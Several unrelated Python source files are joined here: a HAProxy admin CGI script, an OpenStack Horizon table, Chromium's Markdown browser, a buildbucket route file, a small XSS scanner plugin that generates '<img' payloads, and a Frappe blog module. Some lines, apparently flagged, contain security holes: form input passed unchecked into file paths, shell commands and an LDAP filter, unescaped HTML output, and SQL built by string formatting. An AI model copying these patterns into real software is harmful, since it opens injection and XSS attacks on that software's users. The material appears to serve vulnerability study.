	funct.ssh_command(master, ["sudo chmod +x "+tmp_config_path+script, tmp_config_path+script+" MASTER "+interface+" "+vrrpip+" "+kp])
	funct.ssh_command(slave, ["sudo chmod +x "+tmp_config_path+script, tmp_config_path+script+" BACKUP "+interface+" "+vrrpip+" "+kp])
			
	os.system("rm -f %s" % script)
	
if form.getvalue('haproxyaddserv'):
	funct.install_haproxy(form.getvalue('haproxyaddserv'), syn_flood=form.getvalue('syn_flood'))
	
if form.getvalue('installwaf'):
	funct.waf_install(form.getvalue('installwaf'))
	
if form.getvalue('metrics_waf'):
	sql.update_waf_metrics_enable(form.getvalue('metrics_waf'), form.getvalue('enable'))
		
if form.getvalue('table_metrics'):
	import http.cookies
	from jinja2 import Environment, FileSystemLoader
	env = Environment(loader=FileSystemLoader('templates/ajax'))                    
	template = env.get_template('table_metrics.html')
		
	cookie = http.cookies.SimpleCookie(os.environ.get("HTTP_COOKIE"))
	user_id = cookie.get('uuid')	
	table_stat = sql.select_table_metrics(user_id.value)

	template = template.render(table_stat=sql.select_table_metrics(user_id.value))											
	print(template)
		
if form.getvalue('metrics'):
	from datetime import timedelta
	from bokeh.plotting import figure, output_file, show
	from bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker
	from bokeh.layouts import widgetbox, gridplot
	from bokeh.models.widgets import Button, RadioButtonGroup, Select
	import pandas as pd
	import http.cookies
		
	cookie = http.cookies.SimpleCookie(os.environ.get("HTTP_COOKIE"))
	user_id = cookie.get('uuid')	
	servers = sql.select_servers_metrics(user_id.value)
	servers = sorted(servers)
	
	p = {}
	for serv in servers:
		serv = serv[0]
		p[serv] = {}
		metric = sql.select_metrics(serv)
		metrics = {}
		
		for i in metric:
			rep_date = str(i[5])
			metrics[rep_date] = {}
			metrics[rep_date]['server'] = str(i[0])
			metrics[rep_date]['curr_con'] = str(i[1])
			metrics[rep_date]['curr_ssl_con'] = str(i[2])
			metrics[rep_date]['sess_rate'] = str(i[3])
			metrics[rep_date]['max_sess_rate'] = str(i[4])

		df = pd.DataFrame.from_dict(metrics, orient="index")
		df = df.fillna(0)
		df.index = pd.to_datetime(df.index)
		df.index.name = 'Date'
		df.sort_index(inplace=True)
		source = ColumnDataSource(df)
		
		output_file("templates/metrics_out.html", mode='inline')
		
		x_min = df.index.min() - pd.Timedelta(hours=1)
		x_max = df.index.max() + pd.Timedelta(minutes=1)

		p[serv] = figure(
			tools="pan,box_zoom,reset,xwheel_zoom",		
			title=metric[0][0],
			x_axis_type="datetime", y_axis_label='Connections',
			x_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)
			)
			
		hover = HoverTool(
			tooltips=[
				("Connections", "@curr_con"),
				("SSL connections", "@curr_ssl_con"),
				("Sessions rate", "@sess_rate")
			],
			mode='mouse'
		)
		
		p[serv].ygrid.band_fill_color = "#f3f8fb"
		p[serv].ygrid.band_fill_alpha = 0.9
		p[serv].y_range.start = 0
		p[serv].y_range.end = int(df['curr_con'].max()) + 150
		p[serv].add_tools(hover)
		p[serv].title.text_font_size = "20px"						
		p[serv].line("Date", "curr_con", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend="Conn")
		p[serv].line("Date", "curr_ssl_con", source=source, alpha=0.5, color="#5d9ceb", line_width=2, legend="SSL con")
		p[serv].line("Date", "sess_rate", source=source, alpha=0.5, color="#33414e", line_width=2, legend="Sessions")
		p[serv].legend.orientation = "horizontal"
		p[serv].legend.location = "top_left"
		p[serv].legend.padding = 5

	plots = []
	for key, value in p.items():
		plots.append(value)
		
	grid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = "left", toolbar_options=dict(logo=None))
	show(grid)
	
if form.getvalue('waf_metrics'):
	from datetime import timedelta
	from bokeh.plotting import figure, output_file, show
	from bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker
	from bokeh.layouts import widgetbox, gridplot
	from bokeh.models.widgets import Button, RadioButtonGroup, Select
	import pandas as pd
	import http.cookies
		
	cookie = http.cookies.SimpleCookie(os.environ.get("HTTP_COOKIE"))
	user_id = cookie.get('uuid')	
	servers = sql.select_waf_servers_metrics(user_id.value)
	servers = sorted(servers)
	
	p = {}
	for serv in servers:
		serv = serv[0]
		p[serv] = {}
		metric = sql.select_waf_metrics(serv)
		metrics = {}
		
		for i in metric:
			rep_date = str(i[2])
			metrics[rep_date] = {}
			metrics[rep_date]['conn'] = str(i[1])

		df = pd.DataFrame.from_dict(metrics, orient="index")
		df = df.fillna(0)
		df.index = pd.to_datetime(df.index)
		df.index.name = 'Date'
		df.sort_index(inplace=True)
		source = ColumnDataSource(df)
		
		output_file("templates/metrics_waf_out.html", mode='inline')
		
		x_min = df.index.min() - pd.Timedelta(hours=1)
		x_max = df.index.max() + pd.Timedelta(minutes=1)

		p[serv] = figure(
			tools="pan,box_zoom,reset,xwheel_zoom",
			title=metric[0][0],
			x_axis_type="datetime", y_axis_label='Connections',
			x_range = (x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000)
			)
			
		hover = HoverTool(
			tooltips=[
				("Connections", "@conn"),
			],
			mode='mouse'
		)
		
		p[serv].ygrid.band_fill_color = "#f3f8fb"
		p[serv].ygrid.band_fill_alpha = 0.9
		p[serv].y_range.start = 0
		p[serv].y_range.end = int(df['conn'].max()) + 150
		p[serv].add_tools(hover)
		p[serv].title.text_font_size = "20px"				
		p[serv].line("Date", "conn", source=source, alpha=0.5, color='#5cb85c', line_width=2, legend="Conn")
		p[serv].legend.orientation = "horizontal"
		p[serv].legend.location = "top_left"
		p[serv].legend.padding = 5
		
	plots = []
	for key, value in p.items():
		plots.append(value)
		
	grid = gridplot(plots, ncols=2, plot_width=800, plot_height=250, toolbar_location = "left", toolbar_options=dict(logo=None))
	show(grid)
	
if form.getvalue('get_hap_v'):
	output = funct.check_haproxy_version(serv)
	print(output)
	
if form.getvalue('bwlists'):
	list = os.path.dirname(os.getcwd())+"/"+sql.get_setting('lists_path')+"/"+form.getvalue('group')+"/"+form.getvalue('color')+"/"+form.getvalue('bwlists')
	try:
		file = open(list, "r")
		file_read = file.read()
		file.close
		print(file_read)
	except IOError:
		print('<div class="alert alert-danger" style="margin:0">Cat\'n read '+form.getvalue('color')+' list</div>')
		
if form.getvalue('bwlists_create'):
	list_name = form.getvalue('bwlists_create').split('.')[0]
	list_name += '.lst'
	list = os.path.dirname(os.getcwd())+"/"+sql.get_setting('lists_path')+"/"+form.getvalue('group')+"/"+form.getvalue('color')+"/"+list_name
	try:
		open(list, 'a').close()
		print('<div class="alert alert-success" style="margin:0">'+form.getvalue('color')+' list was created</div>')
	except IOError as e:
		print('<div class="alert alert-danger" style="margin:0">Cat\'n create new '+form.getvalue('color')+' list. %s </div>' % e)
		
if form.getvalue('bwlists_save'):
	list = os.path.dirname(os.getcwd())+"/"+sql.get_setting('lists_path')+"/"+form.getvalue('group')+"/"+form.getvalue('color')+"/"+form.getvalue('bwlists_save')
	try:
		with open(list, "w") as file:
			file.write(form.getvalue('bwlists_content'))
	except IOError as e:
		print('<div class="alert alert-danger" style="margin:0">Cat\'n save '+form.getvalue('color')+' list. %s </div>' % e)
	
	servers = sql.get_dick_permit()
	path = sql.get_setting('haproxy_dir')+"/"+form.getvalue('color')
	
	for server in servers:
		funct.ssh_command(server[2], ["sudo mkdir "+path])
		error = funct.upload(server[2], path+"/"+form.getvalue('bwlists_save'), list, dir='fullpath')
		if error:
			print('<div class="alert alert-danger">Upload fail: %s</div>' % error)			
		else:
			print('<div class="alert alert-success" style="margin:10px">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>')
			if form.getvalue('bwlists_restart') == 'restart':
				funct.ssh_command(server[2], ["sudo " + sql.get_setting('restart_command')])
			
if form.getvalue('get_lists'):
	list = os.path.dirname(os.getcwd())+"/"+sql.get_setting('lists_path')+"/"+form.getvalue('group')+"/"+form.getvalue('color')
	lists = funct.get_files(dir=list, format="lst")
	for list in lists:
		print(list)
		
if form.getvalue('get_ldap_email'):
	username = form.getvalue('get_ldap_email')
	import ldap
	
	server = sql.get_setting('ldap_server')
	port = sql.get_setting('ldap_port')
	user = sql.get_setting('ldap_user')
	password = sql.get_setting('ldap_password')
	ldap_base = sql.get_setting('ldap_base')
	domain = sql.get_setting('ldap_domain')
	ldap_search_field = sql.get_setting('ldap_search_field')

	l = ldap.initialize("ldap://"+server+':'+port)
	try:
		l.protocol_version = ldap.VERSION3
		l.set_option(ldap.OPT_REFERRALS, 0)

		bind = l.simple_bind_s(user, password)

		criteria = "(&(objectClass=user)(sAMAccountName="+username+"))"
		attributes = [ldap_search_field]
		result = l.search_s(ldap_base, ldap.SCOPE_SUBTREE, criteria, attributes)

		results = [entry for dn, entry in result if isinstance(entry, dict)]
		try:
			print('["'+results[0][ldap_search_field][0].decode("utf-8")+'","'+domain+'"]')
		except:
			print('error: user not found')
	finally:
		l.unbind()

# Copyright (C) 2015 Yahoo! Inc. All Rights Reserved.
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

import json

from django.utils import safestring                    
from django.utils.translation import ugettext_lazy as _
from django.utils.translation import ungettext_lazy

from horizon import tables

from openstack_dashboard import api


class CreateMappingLink(tables.LinkAction):
    name = "create"
    verbose_name = _("Create Mapping")
    url = "horizon:identity:mappings:create"
    classes = ("ajax-modal",)
    icon = "plus"
    policy_rules = (("identity", "identity:create_mapping"),)


class EditMappingLink(tables.LinkAction):
    name = "edit"
    verbose_name = _("Edit")
    url = "horizon:identity:mappings:update"
    classes = ("ajax-modal",)
    icon = "pencil"
    policy_rules = (("identity", "identity:update_mapping"),)


class DeleteMappingsAction(tables.DeleteAction):
    @staticmethod
    def action_present(count):
        return ungettext_lazy(
            u"Delete Mapping",
            u"Delete Mappings",
            count
        )

    @staticmethod
    def action_past(count):
        return ungettext_lazy(
            u"Deleted Mapping",
            u"Deleted Mappings",
            count
        )
    policy_rules = (("identity", "identity:delete_mapping"),)

    def delete(self, request, obj_id):
        api.keystone.mapping_delete(request, obj_id)


class MappingFilterAction(tables.FilterAction):
    def filter(self, table, mappings, filter_string):
        """Naive case-insensitive search."""
        q = filter_string.lower()
        return [mapping for mapping in mappings
                if q in mapping.ud.lower()]


def get_rules_as_json(mapping):
    rules = getattr(mapping, 'rules', None)
    if rules:
        rules = json.dumps(rules, indent=4)
    return safestring.mark_safe(rules)                    


class MappingsTable(tables.DataTable):
    id = tables.Column('id', verbose_name=_('Mapping ID'))
    description = tables.Column(get_rules_as_json,
                                verbose_name=_('Rules'))

    class Meta(object):
        name = "idp_mappings"
        verbose_name = _("Attribute Mappings")
        row_actions = (EditMappingLink, DeleteMappingsAction)
        table_actions = (MappingFilterAction, CreateMappingLink,
                         DeleteMappingsAction)

#!/usr/bin/env python
# Copyright 2015 The Chromium Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

"""Simple Markdown browser for a Git checkout."""
from __future__ import print_function

import SimpleHTTPServer
import SocketServer
import argparse
import codecs
import os
import re
import socket
import sys
import threading
import time
import webbrowser
from xml.etree import ElementTree


THIS_DIR = os.path.realpath(os.path.dirname(__file__))
SRC_DIR = os.path.dirname(os.path.dirname(THIS_DIR))
sys.path.insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown'))
import markdown


def main(argv):
  parser = argparse.ArgumentParser(prog='md_browser')
  parser.add_argument('-p', '--port', type=int, default=8080,
                      help='port to run on (default = %(default)s)')
  parser.add_argument('-d', '--directory', type=str, default=SRC_DIR)
  parser.add_argument('-e', '--external', action='store_true',
                      help='whether to bind to external port')
  parser.add_argument('file', nargs='?',
                      help='open file in browser')
  args = parser.parse_args(argv)

  top_level = os.path.realpath(args.directory)
  hostname = '0.0.0.0' if args.external else 'localhost'
  server_address = (hostname, args.port)
  s = Server(server_address, top_level)

  origin = 'http://' + hostname
  if args.port != 80:
    origin += ':%s' % args.port
  print('Listening on %s/' % origin)

  thread = None
  if args.file:
    path = os.path.realpath(args.file)
    if not path.startswith(top_level):
      print('%s is not under %s' % (args.file, args.directory))
      return 1
    rpath = os.path.relpath(path, top_level)
    url = '%s/%s' % (origin, rpath)
    print('Opening %s' % url)
    thread = threading.Thread(target=_open_url, args=(url,))
    thread.start()

  elif os.path.isfile(os.path.join(top_level, 'docs', 'README.md')):
    print(' Try loading %s/docs/README.md' % origin)
  elif os.path.isfile(os.path.join(args.directory, 'README.md')):
    print(' Try loading %s/README.md' % origin)

  retcode = 1
  try:
    s.serve_forever()
  except KeyboardInterrupt:
    retcode = 130
  except Exception as e:
    print('Exception raised: %s' % str(e))

  s.shutdown()
  if thread:
    thread.join()
  return retcode


def _open_url(url):
  time.sleep(1)
  webbrowser.open(url)


def _gitiles_slugify(value, _separator):
  """Convert a string (representing a section title) to URL anchor name.

  This function is passed to "toc" extension as an extension option, so we
  can emulate the way how Gitiles converts header titles to URL anchors.

  Gitiles' official documentation about the conversion is at:

  https://gerrit.googlesource.com/gitiles/+/master/Documentation/markdown.md#Named-anchors

  Args:
    value: The name of a section that is to be converted.
    _separator: Unused. This is actually a configurable string that is used
        as a replacement character for spaces in the title, typically set to
        '-'. Since we emulate Gitiles' way of slugification here, it makes
        little sense to have the separator charactor configurable.
  """

  # TODO(yutak): Implement accent removal. This does not seem easy without
  # some library. For now we just make accented characters turn into
  # underscores, just like other non-ASCII characters.

  value = value.encode('ascii', 'replace')  # Non-ASCII turns into '?'.
  value = re.sub(r'[^- a-zA-Z0-9]', '_', value)  # Non-alphanumerics to '_'.
  value = value.replace(u' ', u'-')
  value = re.sub(r'([-_])[-_]+', r'\1', value)  # Fold hyphens and underscores.
  return value


class Server(SocketServer.TCPServer):
  def __init__(self, server_address, top_level):
    SocketServer.TCPServer.__init__(self, server_address, Handler)
    self.top_level = top_level

  def server_bind(self):
    self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    self.socket.bind(self.server_address)


class Handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
  def do_GET(self):
    path = self.path

    # strip off the repo and branch info, if present, for compatibility
    # with gitiles.
    if path.startswith('/chromium/src/+/master'):
      path = path[len('/chromium/src/+/master'):]

    full_path = os.path.realpath(os.path.join(self.server.top_level, path[1:]))

    if not full_path.startswith(self.server.top_level):
      self._DoUnknown()
    elif path in ('/base.css', '/doc.css', '/prettify.css'):
      self._DoCSS(path[1:])
    elif not os.path.exists(full_path):
      self._DoNotFound()
    elif path.lower().endswith('.md'):
      self._DoMD(path)
    elif os.path.exists(full_path + '/README.md'):
      self._DoMD(path + '/README.md')
    elif path.lower().endswith('.png'):
      self._DoImage(full_path, 'image/png')
    elif path.lower().endswith('.jpg'):
      self._DoImage(full_path, 'image/jpeg')
    elif os.path.isdir(full_path):
      self._DoDirListing(full_path)
    elif os.path.exists(full_path):
      self._DoRawSourceFile(full_path)
    else:
      self._DoUnknown()

  def _DoMD(self, path):
    extensions = [
        'markdown.extensions.def_list',
        'markdown.extensions.fenced_code',
        'markdown.extensions.tables',
        'markdown.extensions.toc',
        'gitiles_autolink',
        'gitiles_ext_blocks',
        'gitiles_smart_quotes',
    ]
    extension_configs = {
        'markdown.extensions.toc': {
            'slugify': _gitiles_slugify
        },
    }

    contents = self._Read(path[1:])

    md = markdown.Markdown(extensions=extensions,
                           extension_configs=extension_configs,
                           tab_length=2,
                           output_format='html4')

    has_a_single_h1 = (len([line for line in contents.splitlines()
                            if (line.startswith('#') and
                                not line.startswith('##'))]) == 1)

    md.treeprocessors['adjust_toc'] = _AdjustTOC(has_a_single_h1)

    md_fragment = md.convert(contents).encode('utf-8')

    try:
      self._WriteHeader('text/html')
      self._WriteTemplate('header.html')
      self.wfile.write('<div class="doc">')
      self.wfile.write(md_fragment)
      self.wfile.write('</div>')
      self._WriteTemplate('footer.html')
    except:
      raise

  def _DoRawSourceFile(self, full_path):
    self._WriteHeader('text/html')
    self._WriteTemplate('header.html')

    self.wfile.write('<table class="FileContents">')
    with open(full_path) as fp:
      # Escape html over the entire file at once.
      data = fp.read().replace(
          '&', '&amp;').replace(
          '<', '&lt;').replace(
          '>', '&gt;').replace(
          '"', '&quot;')
      for i, line in enumerate(data.splitlines(), start=1):
        self.wfile.write(
          ('<tr class="u-pre u-monospace FileContents-line">'
           '<td class="u-lineNum u-noSelect FileContents-lineNum">'
           '<a name="%(num)s" '
           'onclick="window.location.hash=%(quot)s#%(num)s%(quot)s">'
           '%(num)s</a></td>'
           '<td class="FileContents-lineContents">%(line)s</td></tr>')
          % {'num': i, 'quot': "'", 'line': line})
    self.wfile.write('</table>')

    self._WriteTemplate('footer.html')

  def _DoCSS(self, template):
    self._WriteHeader('text/css')
    self._WriteTemplate(template)

  def _DoNotFound(self):
    self._WriteHeader('text/html', status_code=404)
    self.wfile.write('<html><body>%s not found</body></html>' % self.path)

  def _DoUnknown(self):
    self._WriteHeader('text/html', status_code=501)
    self.wfile.write('<html><body>I do not know how to serve %s.</body>'
                       '</html>' % self.path)

  def _DoDirListing(self, full_path):
    self._WriteHeader('text/html')
    self._WriteTemplate('header.html')
    self.wfile.write('<div class="doc">')

    self.wfile.write('<div class="Breadcrumbs">\n')
    self.wfile.write('<a class="Breadcrumbs-crumb">%s</a>\n' % self.path)                    
    self.wfile.write('</div>\n')

    for _, dirs, files in os.walk(full_path):
      for f in sorted(files):
        if f.startswith('.'):
          continue
        if f.endswith('.md'):
          bold = ('<b>', '</b>')
        else:
          bold = ('', '')
        self.wfile.write('<a href="%s/%s">%s%s%s</a><br/>\n' %
                         (self.path.rstrip('/'), f, bold[0], f, bold[1]))                    

      self.wfile.write('<br/>\n')

      for d in sorted(dirs):
        if d.startswith('.'):
          continue
        self.wfile.write('<a href="%s/%s">%s/</a><br/>\n' %
                         (self.path.rstrip('/'), d, d))                    

      break

    self.wfile.write('</div>')
    self._WriteTemplate('footer.html')

  def _DoImage(self, full_path, mime_type):
    self._WriteHeader(mime_type)
    with open(full_path) as f:
      self.wfile.write(f.read())
      f.close()

  def _Read(self, relpath, relative_to=None):
    if relative_to is None:
      relative_to = self.server.top_level
    assert not relpath.startswith(os.sep)
    path = os.path.join(relative_to, relpath)
    with codecs.open(path, encoding='utf-8') as fp:
      return fp.read()

  def _WriteHeader(self, content_type='text/plain', status_code=200):
    self.send_response(status_code)
    self.send_header('Content-Type', content_type)
    self.end_headers()

  def _WriteTemplate(self, template):
    contents = self._Read(os.path.join('tools', 'md_browser', template),
                          relative_to=SRC_DIR)
    self.wfile.write(contents.encode('utf-8'))


class _AdjustTOC(markdown.treeprocessors.Treeprocessor):
  def __init__(self, has_a_single_h1):
    super(_AdjustTOC, self).__init__()
    self.has_a_single_h1 = has_a_single_h1

  def run(self, tree):
    # Given
    #
    #     # H1
    #
    #     [TOC]
    #
    #     ## first H2
    #
    #     ## second H2
    #
    # the markdown.extensions.toc extension generates:
    #
    #     <div class='toc'>
    #       <ul><li><a>H1</a>
    #               <ul><li>first H2
    #                   <li>second H2</li></ul></li><ul></div>
    #
    # for [TOC]. But, we want the TOC to have its own subheading, so
    # we rewrite <div class='toc'><ul>...</ul></div> to:
    #
    #     <div class='toc'>
    #        <h2>Contents</h2>
    #        <div class='toc-aux'>
    #          <ul>...</ul></div></div>
    #
    # In addition, if the document only has a single H1, it is usually the
    # title, and we don't want the title to be in the TOC. So, we remove it
    # and shift all of the title's children up a level, leaving:
    #
    #     <div class='toc'>
    #       <h2>Contents</h2>
    #       <div class='toc-aux'>
    #       <ul><li>first H2
    #           <li>second H2</li></ul></div></div>

    for toc_node in tree.findall(".//*[@class='toc']"):
      toc_ul = toc_node[0]
      if self.has_a_single_h1:
        toc_ul_li = toc_ul[0]
        ul_with_the_desired_toc_entries = toc_ul_li[1]
      else:
        ul_with_the_desired_toc_entries = toc_ul

      toc_node.remove(toc_ul)
      contents = ElementTree.SubElement(toc_node, 'h2')
      contents.text = 'Contents'
      contents.tail = '\n'
      toc_aux = ElementTree.SubElement(toc_node, 'div', {'class': 'toc-aux'})
      toc_aux.text = '\n'
      toc_aux.append(ul_with_the_desired_toc_entries)
      toc_aux.tail = '\n'


if __name__ == '__main__':
  sys.exit(main(sys.argv[1:]))

# Copyright 2017 The Chromium Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

from google.appengine.api import users as gae_users                    

from components import auth
from components import config as config_api
from components import decorators
from components import endpoints_webapp2
from components import prpc

import webapp2

from legacy import api as legacy_api
from legacy import swarmbucket_api
import access
import api
import bq
import bulkproc
import config
import expiration
import model
import notifications
import service
import swarming
import user

README_MD = (
    'https://chromium.googlesource.com/infra/infra/+/master/'
    'appengine/cr-buildbucket/README.md'
)


class MainHandler(webapp2.RequestHandler):  # pragma: no cover
  """Redirects to README.md."""

  def get(self):
    return self.redirect(README_MD)


class CronUpdateBuckets(webapp2.RequestHandler):  # pragma: no cover
  """Updates buckets from configs."""

  @decorators.require_cronjob
  def get(self):
    config.cron_update_buckets()


class BuildRPCHandler(webapp2.RequestHandler):  # pragma: no cover
  """Redirects to API explorer to see the build."""

  def get(self, build_id):
    api_path = '/_ah/api/buildbucket/v1/builds/%s' % build_id
    return self.redirect(api_path)


class ViewBuildHandler(auth.AuthenticatingHandler):  # pragma: no cover
  """Redirects to API explorer to see the build."""

  @auth.public
  def get(self, build_id):
    try:
      build_id = int(build_id)
    except ValueError as ex:                    
      self.response.write(ex.message)                    
      self.abort(400)

    build = model.Build.get_by_id(build_id)
    can_view = build and user.can_view_build_async(build).get_result()

    if not can_view:
      if auth.get_current_identity().is_anonymous:
        return self.redirect(gae_users.create_login_url(self.request.url))                    
      self.response.write('build %d not found' % build_id)
      self.abort(404)

    return self.redirect(str(build.url))


class TaskCancelSwarmingTask(webapp2.RequestHandler):  # pragma: no cover
  """Cancels a swarming task."""

  @decorators.require_taskqueue('backend-default')
  def post(self, host, task_id):
    swarming.cancel_task(host, task_id)


class UnregisterBuilders(webapp2.RequestHandler):  # pragma: no cover
  """Unregisters builders that didn't have builds for a long time."""

  @decorators.require_cronjob
  def get(self):
    service.unregister_builders()


def get_frontend_routes():  # pragma: no cover
  endpoints_services = [
      legacy_api.BuildBucketApi,
      config_api.ConfigApi,
      swarmbucket_api.SwarmbucketApi,
  ]
  routes = [
      webapp2.Route(r'/', MainHandler),
      webapp2.Route(r'/b/<build_id:\d+>', BuildRPCHandler),
      webapp2.Route(r'/build/<build_id:\d+>', ViewBuildHandler),
  ]
  routes.extend(endpoints_webapp2.api_routes(endpoints_services))
  # /api routes should be removed once clients are hitting /_ah/api.
  routes.extend(
      endpoints_webapp2.api_routes(endpoints_services, base_path='/api')
  )

  prpc_server = prpc.Server()
  prpc_server.add_interceptor(auth.prpc_interceptor)
  prpc_server.add_service(access.AccessServicer())
  prpc_server.add_service(api.BuildsApi())
  routes += prpc_server.get_routes()

  return routes


def get_backend_routes():  # pragma: no cover
  prpc_server = prpc.Server()
  prpc_server.add_interceptor(auth.prpc_interceptor)
  prpc_server.add_service(api.BuildsApi())

  return [  # pragma: no branch
      webapp2.Route(r'/internal/cron/buildbucket/expire_build_leases',
                    expiration.CronExpireBuildLeases),
      webapp2.Route(r'/internal/cron/buildbucket/expire_builds',
                    expiration.CronExpireBuilds),
      webapp2.Route(r'/internal/cron/buildbucket/delete_builds',
                    expiration.CronDeleteBuilds),
      webapp2.Route(r'/internal/cron/buildbucket/update_buckets',
                    CronUpdateBuckets),
      webapp2.Route(r'/internal/cron/buildbucket/bq-export-prod',
                    bq.CronExportBuildsProd),
      webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental',
                    bq.CronExportBuildsExperimental),
      webapp2.Route(r'/internal/cron/buildbucket/unregister-builders',
                    UnregisterBuilders),
      webapp2.Route(r'/internal/task/buildbucket/notify/<build_id:\d+>',
                    notifications.TaskPublishNotification),
      webapp2.Route(
          r'/internal/task/buildbucket/cancel_swarming_task/<host>/<task_id>',
          TaskCancelSwarmingTask),
  ] + bulkproc.get_routes() + prpc_server.get_routes()

from cores.base_plugins import Scanner
import re

class Check(Scanner):
	def gen_payload(self):
		from cores.xeger import Xeger
		generate = Xeger()
		while True:
			_payload = generate.xeger("((\%3C)|<)((\%69)|i|(\%49))((\%6D)|m|(\%4D))((\%67)|g|(\%47))[^\n]+((\%3E)|>)")
			if any(x in _payload for x in "\"'><;/"):
				return _payload

	def check(self, url, payload, response, parameter):                    
		for injection_types in self.signatures.keys():
			for sig in self.signatures[injection_types]:
				match = re.findall(re.escape(sig), response)
				if match and any(x in payload for x in "><"):
					self.found(injection_types, url, parameter, payload)                    
					return True                    
		return False
	
	def signature(self):
		return {"XSS" : self.payload}

# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals

import frappe
from frappe import _
from frappe.website.website_generator import WebsiteGenerator
from frappe.website.render import clear_cache
from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown                    
from frappe.website.utils import find_first_image, get_comment_list

class BlogPost(WebsiteGenerator):
	website = frappe._dict(
		order_by = "published_on desc"
	)

	def make_route(self):
		if not self.route:
			return frappe.db.get_value('Blog Category', self.blog_category,
				'route') + '/' + self.scrub(self.title)

	def get_feed(self):
		return self.title

	def validate(self):
		super(BlogPost, self).validate()

		if not self.blog_intro:
			self.blog_intro = self.content[:140]
			self.blog_intro = strip_html_tags(self.blog_intro)

		if self.blog_intro:
			self.blog_intro = self.blog_intro[:140]

		if self.published and not self.published_on:
			self.published_on = today()

		# update posts
		frappe.db.sql("""update tabBlogger set posts=(select count(*) from `tabBlog Post`
			where ifnull(blogger,'')=tabBlogger.name)
			where name=%s""", (self.blogger,))

	def on_update(self):
		clear_cache("writers")

	def get_context(self, context):
		# this is for double precaution. usually it wont reach this code if not published
		if not cint(self.published):
			raise Exception("This blog has not been published yet!")

		# temp fields
		context.full_name = get_fullname(self.owner)
		context.updated = global_date_format(self.published_on)

		if self.blogger:
			context.blogger_info = frappe.get_doc("Blogger", self.blogger).as_dict()

		context.description = self.blog_intro or self.content[:140]

		context.metatags = {
			"name": self.title,
			"description": context.description,
		}

		if "<!-- markdown -->" in context.content:
			context.content = markdown(context.content)

		image = find_first_image(self.content)
		if image:
			context.metatags["image"] = image

		context.comment_list = get_comment_list(self.doctype, self.name)
		if not context.comment_list:
			context.comment_text = _('No comments yet')
		else:
			if(len(context.comment_list)) == 1:
				context.comment_text = _('1 comment')
			else:
				context.comment_text = _('{0} comments').format(len(context.comment_list))

		context.category = frappe.db.get_value("Blog Category",
			context.doc.blog_category, ["title", "route"], as_dict=1)
		context.parents = [{"name": _("Home"), "route":"/"},
			{"name": "Blog", "route": "/blog"},
			{"label": context.category.title, "route":context.category.route}]

def get_list_context(context=None):
	list_context = frappe._dict(
		template = "templates/includes/blog/blog.html",
		get_list = get_blog_list,
		hide_filters = True,
		children = get_children(),
		# show_search = True,
		title = _('Blog')
	)

	category = frappe.local.form_dict.blog_category or frappe.local.form_dict.category                    
	if category:
		category_title = get_blog_category(category)
		list_context.sub_title = _("Posts filed under {0}").format(category_title)
		list_context.title = category_title

	elif frappe.local.form_dict.blogger:
		blogger = frappe.db.get_value("Blogger", {"name": frappe.local.form_dict.blogger}, "full_name")
		list_context.sub_title = _("Posts by {0}").format(blogger)
		list_context.title = blogger

	elif frappe.local.form_dict.txt:
		list_context.sub_title = _('Filtered by "{0}"').format(frappe.local.form_dict.txt)                    

	if list_context.sub_title:
		list_context.parents = [{"name": _("Home"), "route": "/"},
								{"name": "Blog", "route": "/blog"}]
	else:
		list_context.parents = [{"name": _("Home"), "route": "/"}]

	list_context.update(frappe.get_doc("Blog Settings", "Blog Settings").as_dict(no_default_fields=True))
	return list_context

def get_children():
	return frappe.db.sql("""select route as name,
		title from `tabBlog Category`
		where published = 1
		and exists (select name from `tabBlog Post`
			where `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1)
		order by title asc""", as_dict=1)

def clear_blog_cache():
	for blog in frappe.db.sql_list("""select route from
		`tabBlog Post` where ifnull(published,0)=1"""):
		clear_cache(blog)

	clear_cache("writers")

def get_blog_category(route):
	return frappe.db.get_value("Blog Category", {"name": route}, "title") or route

def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length=20, order_by=None):
	conditions = []
	if filters:
		if filters.blogger:
			conditions.append('t1.blogger="%s"' % frappe.db.escape(filters.blogger))
		if filters.blog_category:
			conditions.append('t1.blog_category="%s"' % frappe.db.escape(filters.blog_category))

	if txt:
		conditions.append('(t1.content like "%{0}%" or t1.title like "%{0}%")'.format(frappe.db.escape(txt)))

	if conditions:
		frappe.local.no_cache = 1

	query = """\
		select
			t1.title, t1.name, t1.blog_category, t1.route, t1.published_on,
				t1.published_on as creation,
				t1.content as content,
				ifnull(t1.blog_intro, t1.content) as intro,
				t2.full_name, t2.avatar, t1.blogger,
				(select count(name) from `tabCommunication`
					where
						communication_type='Comment'
						and comment_type='Comment'
						and reference_doctype='Blog Post'
						and reference_name=t1.name) as comments
		from `tabBlog Post` t1, `tabBlogger` t2
		where ifnull(t1.published,0)=1
		and t1.blogger = t2.name
		%(condition)s
		order by published_on desc, name asc
		limit %(start)s, %(page_len)s""" % {
			"start": limit_start, "page_len": limit_page_length,
				"condition": (" and " + " and ".join(conditions)) if conditions else ""
		}

	posts = frappe.db.sql(query, as_dict=1)

	for post in posts:
		post.cover_image = find_first_image(post.content)
		post.published = global_date_format(post.creation)
